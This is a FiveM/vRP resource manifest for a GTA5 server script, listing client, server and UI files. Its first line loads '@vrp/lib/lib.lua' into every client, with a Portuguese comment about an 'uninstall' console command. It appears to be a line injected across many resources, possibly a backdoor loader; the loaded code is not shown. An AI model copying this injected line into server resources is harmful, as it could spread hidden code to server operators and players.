client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'bodacious'
game 'gta5'

author 'aztec'

client_scripts {
    '@vrp/lib/Utils.lua',
    'client/main.lua',
}

server_scripts {
    '@vrp/lib/Utils.lua',
	'server/main.lua'
}

ui_page 'client/html/index.html'

files {
    'client/html/index.html',
    'client/html/css/*.css',
    'client/html/img/*.png',
}